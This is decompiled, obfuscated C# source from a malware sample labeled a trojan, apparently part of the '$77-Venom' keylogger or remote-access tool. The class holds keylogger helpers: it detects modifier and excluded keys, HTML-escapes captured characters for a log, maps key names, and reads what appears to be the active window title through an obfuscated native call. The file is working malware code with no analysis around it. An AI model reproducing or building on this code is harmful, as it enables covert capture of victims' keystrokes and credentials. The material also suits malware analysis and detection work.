// Decompiled with JetBrains decompiler
// Type: ꄪ調轩㹡﷝쑍靼悮䕛ꨩᲉ㾬�ㇺ㰤䘎펧㶌봆
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan.MSIL.Zapchast.gen-2e1eda10e2bbd19418706a23888807e50c0407eb191cc26d541c85279193c3db.exe

using System;
using System.Collections.Generic;
using System.Text;
using System.Windows.Forms;

public static class ꄪ調轩㹡\uFDDD쑍靼悮䕛ꨩ\u1C89㾬\uFFFDㇺ㰤䘎펧㶌봆\uE560
{
  public static bool IsModifierKeysSet(this List<Keys> pressedKeys)
  {
    if (pressedKeys == null)
      return false;
    return pressedKeys.Contains(Keys.LControlKey) || pressedKeys.Contains(Keys.RControlKey) || pressedKeys.Contains(Keys.LMenu) || pressedKeys.Contains(Keys.RMenu) || pressedKeys.Contains(Keys.LWin) || pressedKeys.Contains(Keys.RWin) || pressedKeys.Contains(Keys.Control) || pressedKeys.Contains(Keys.Alt);
  }

  public static bool IsModifierKey(this Keys key) => key == Keys.LControlKey || key == Keys.RControlKey || key == Keys.LMenu || key == Keys.RMenu || key == Keys.LWin || key == Keys.RWin || key == Keys.Control || key == Keys.Alt;

  public static bool ContainsKeyChar(this List<Keys> pressedKeys, char c) => pressedKeys.Contains((Keys) char.ToUpper(c));

  public static bool IsExcludedKey(this Keys k) => k >= Keys.A && k <= Keys.Z || k >= Keys.NumPad0 && k <= Keys.Divide || k >= Keys.D0 && k <= Keys.D9 || k >= Keys.OemSemicolon && k <= Keys.OemClear || k >= Keys.LShiftKey && k <= Keys.RShiftKey || k == Keys.Capital || k == Keys.Space;

  public static bool 띸ꅞ\uF60C쒎흣Ϭ澍솠ଅ뫔\u2E84０ⶺ\u20B7\uECB9ᾞ睏뚠洑蚫(List<char> list, char search) => list.FindAll(new Predicate<char>(new ꄪ調轩㹡\uFDDD쑍靼悮䕛ꨩ\u1C89㾬\uFFFDㇺ㰤䘎펧㶌봆\uE560.ꋮ鉡鸲䪿媗㑛ⲵᇓ蘁\u2571䝴籽㱑ἵ\uF17EἍ睇벏兺묟()
  {
    \uFFFD緇蜺稌냇\u2A89햻\uEBBA麊\uA6F9璴䊛崎䃎㿷肢ㄚ徵\uEDE0\uFFFD = search
  }.Ἔ廬渌ﮑ镖讔멉ₖ\uF710䝮\uA4FE㴪욞㮈뛃멥\u20FC絏ꗀ䱿)).Count > 1;

  public static string ℱ깔쑱榊夌뵞郞\uFFFD\u243D鴯鹼ೈ膁漾漄ﰕ\u33EB磻夅\u2419(char key)
  {
    if (key < ' ')
      return string.Empty;
    switch (key)
    {
      case ' ':
        return "&nbsp;";
      case '"':
        return "&quot;";
      case '#':
        return "&#35;";
      case '&':
        return "&amp;";
      case '\'':
        return "&apos;";
      case '<':
        return "&lt;";
      case '>':
        return "&gt;";
      default:
        return key.ToString();
    }
  }

  public static string \u0743䋣為㛤暀熼붙쵮鴲\uE05F䣘\uF71AȰ寤ꎻ\u3373깜\u087Aྐ㷋(string input) => input.Replace("<", "&lt;").Replace(">", "&gt;").Replace("\"", "&quot;").Replace("'", "&apos;");

  public static string \uE6E6ⷌ宸䧹\uFFFD䐼桯蔼聮茔ꑘ\uF777杦皷톶\uFFFD榺쵕\u09FC齌(Keys key, bool altGr = false)
  {
    string str = key.ToString();
    if (str.Contains("ControlKey"))
      return "Control";
    if (str.Contains("Menu"))
      return "Alt";
    if (str.Contains("Win"))
      return "Win";
    return str.Contains("Shift") ? "Shift" : str;
  }

  public static string 넆巤鴉㓎䁐䥥㖳鵸藬䏋\u2F7A䀙\u1289挈ᰟ졋ꚤ唤ﭿ\u2E62()
  {
    StringBuilder lpString = new StringBuilder(1024);
    豴뭒킖\uF076秅ୈ\uEE53\u29B7횾彉\uE434栅憎뀯魷줣逰숴쑦ⱌ.㷟琛ԃﮱ밤\u299E\uF557Ꚅ\uF611ᚿ봞饒\uFFFD닢柼饊뼹첲粲ꌴ(豴뭒킖\uF076秅ୈ\uEE53\u29B7횾彉\uE434栅憎뀯魷줣逰숴쑦ⱌ.銰欌Ի\uFFFDₕ؅慊폫\uF8D0Ԩ媒咼\uE0E2\u33AB\uEDBB유䒪\uFFFD\u2718鏣(), lpString, lpString.Capacity);
    string str = lpString.ToString();
    return string.IsNullOrEmpty(str) ? (string) null : str;
  }
}
